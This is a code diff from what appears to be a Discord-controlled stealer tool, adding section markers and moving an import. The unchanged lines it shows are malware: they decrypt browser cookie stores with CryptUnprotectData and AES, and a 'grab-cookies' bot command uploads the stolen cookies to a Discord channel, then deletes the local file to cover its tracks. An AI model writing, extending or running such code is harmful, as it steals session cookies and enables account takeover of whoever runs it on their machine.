@@ -1,19 +1,22 @@
+#<imports>
 import base64
 import json
 import time
 import os
 import random
+import asyncio
 import sqlite3
 from shutil import copy2
 import psutil
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 import subprocess
+#</imports>
 
+#<engine>
 def grab_cookies():
     browser = Browsers()
     browser.grab_cookies()
-
 
 def create_temp(_dir: str or os.PathLike = None):
     if _dir is None:
@@ -133,9 +136,9 @@ class Browsers:
         conn.close()
         os.remove(cookievault)
         return
+#</engine>
 
-import asyncio
-
+#<command>
 @client.command(name="grab-cookies")
 async def grab_cookies(ctx):
     await ctx.send('```Grabbing cookies. Please wait...```')
@@ -143,3 +146,4 @@ async def grab_cookies(ctx):
     await asyncio.sleep(1)
     await ctx.send('```Grabbed cookies```', file=discord.File(f'cookies.txt', filename='cookies.txt'))
     subprocess.run(f'del cookies.txt', shell=True)
+#</command>
